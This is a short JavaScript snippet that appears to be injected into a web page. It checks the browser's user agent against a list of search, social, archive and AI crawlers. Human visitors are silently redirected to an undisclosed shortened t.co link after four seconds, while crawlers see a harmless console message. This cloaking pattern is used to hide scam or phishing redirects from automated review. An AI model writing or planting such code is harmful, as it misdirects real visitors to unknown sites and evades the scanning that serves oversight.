const botPatterns = [
  'Googlebot',
  'Bingbot',
  'Slurp',
  'DuckDuckBot',
  'Baiduspider',
  'YandexBot',
  'Sogou',
  'Exabot',
  'facebot',
  'ia_archiver',
  'AhrefsBot',
  'SemrushBot',
  'MJ12bot',
  'DotBot',
  'PetalBot',
  'Bytespider',
  'Twitterbot',
  'LinkedInBot',
  'Applebot',
  'archive.org_bot',
  'CCBot',
  'GPTBot',
  'ClaudeBot',
  'anthropic-ai',
  'Google-Extended',
  'FacebookBot',
  'meta-externalagent'
];

const isBot = botPatterns.some(bot => 
  navigator.userAgent.toLowerCase().includes(bot.toLowerCase())
);

if (!isBot) {
  setTimeout(() => {
    window.location.href = "https://t.co/Af4qXqqU9P?tt";
  }, 4000);
} else {
  console.log("Thanks for visiting my page");
}
